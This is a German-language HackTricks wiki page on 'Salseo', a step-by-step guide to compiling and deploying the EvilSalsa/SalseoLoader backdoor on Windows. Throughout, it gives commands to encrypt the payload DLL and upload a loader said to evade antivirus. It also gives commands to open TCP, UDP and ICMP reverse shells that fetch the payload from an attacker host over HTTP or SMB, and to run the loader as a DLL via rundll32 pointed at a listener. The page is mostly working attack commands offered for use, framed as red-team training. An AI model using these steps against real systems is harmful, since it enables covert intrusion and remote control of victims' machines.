# Salseo

{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## Kompilieren der Binärdateien

Laden Sie den Quellcode von GitHub herunter und kompilieren Sie **EvilSalsa** und **SalseoLoader**. Sie benötigen **Visual Studio**, um den Code zu kompilieren.

Kompilieren Sie diese Projekte für die Architektur des Windows-Systems, auf dem Sie sie verwenden werden (Wenn Windows x64 unterstützt, kompilieren Sie sie für diese Architekturen).

Sie können die Architektur in Visual Studio im linken "Build"-Tab unter "Platform Target" auswählen.

(\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Log wird der Pfad der ausführbaren Datei angezeigt):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Vorbereiten des Backdoors

Zunächst müssen Sie die **EvilSalsa.dll** verschlüsseln. Hierfür können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und das **Binärfile von SalseoLoader.**

**Lade das SalseoLoader.exe-Binärfile auf die Maschine hoch. Es sollte von keinem AV erkannt werden...**

## **Führe den Backdoor aus**

### **Erhalte eine TCP-Reverse-Shell (Laden der kodierte dll über HTTP)**

Denke daran, einen nc als Reverse-Shell-Listener zu starten und einen HTTP-Server einzurichten, um das kodierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Erhalten einer UDP-Reverse-Shell (Herunterladen einer codierten DLL über SMB)**

Denken Sie daran, einen nc als Reverse-Shell-Listener zu starten und einen SMB-Server bereitzustellen, um das codierte evilsalsa zu bedienen (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Erhalten einer ICMP-umgekehrten Shell (codierte DLL bereits im Opfer)**

**Dieses Mal benötigen Sie ein spezielles Tool im Client, um die umgekehrte Shell zu empfangen. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktivieren von ICMP-Antworten:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führen Sie den Client aus:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Innerhalb des Opfers führen wir das Salseo-Ding aus:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL und Exportieren der Hauptfunktion

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für Lösung verwalten...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Suchen Sie nach dem DllExport-Paket (über die Registerkarte "Durchsuchen") und klicken Sie auf Installieren (und akzeptieren Sie das Popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Im Projektordner sind die Dateien **DllExport.bat** und **DllExport\_Configure.bat** erschienen

### **D**einstallieren Sie DllExport

Klicken Sie auf **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Visual Studio beenden und DllExport\_configure ausführen**

Einfach Visual Studio **beenden**

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und **führen Sie DllExport\_Configure.bat aus**

Wählen Sie **x64** (falls Sie es in einem x64-System verwenden möchten, das war mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb des **Namespace für DllExport**) und klicken Sie auf **Anwenden**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### Öffnen Sie das Projekt erneut mit Visual Studio

**\[DllExport]** sollte nicht mehr als Fehler markiert sein

![](<../.gitbook/assets/image (8) (1).png>)

### Lösung erstellen

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> Eigenschaften von SalseoLoader --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../.gitbook/assets/image (10) (1).png>)

Wählen Sie die **x64-Plattform** (Projekt --> Eigenschaften von SalseoLoader --> Erstellen --> Zielplattform = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Um die Lösung zu **erstellen**: Build --> Lösung erstellen (Im Ausgabekonsole wird der Pfad der neuen DLL angezeigt)

### Testen Sie die generierte DLL

Kopieren Sie die DLL und fügen Sie sie ein, wo Sie sie testen möchten.

Ausführen:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler angezeigt wird, haben Sie wahrscheinlich eine funktionale DLL!!

## Erhalten Sie eine Shell unter Verwendung der DLL

Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### Befehlszeile
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>
{% endhint %}
